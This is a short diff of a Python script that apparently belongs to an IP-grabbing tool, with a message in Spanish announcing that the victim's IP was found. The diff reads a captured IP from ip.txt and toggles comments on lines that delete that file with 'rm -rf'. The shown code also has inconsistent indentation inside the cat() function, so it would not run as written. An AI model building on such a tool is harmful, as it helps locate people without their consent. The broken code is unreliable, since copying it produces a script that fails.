@@ -15,9 +15,9 @@ logo = """\033[33m
 
 def cat():
  # os.system("cat ip.txt")
-  print('\n\033[94m[!] IP de la victima encontrado')
+ # print('\n\033[94m[!] IP de la victima encontrado')
   print(f'\n[~] IP: ', os.system("cat ip.txt"))
- # os.system("rm -rf ip.txt")
+  os.system("rm -rf ip.txt")
 
 def check():
     #os.system("touch ip.txt")
@@ -28,7 +28,7 @@ def check():
             lines = ip.read().rstrip()
             if len(lines) != 0:
                 cat()
-                os.system("rm -rf ip.txt")
+              #  os.system("rm -rf ip.txt")
           ip.close()
 
 def server():
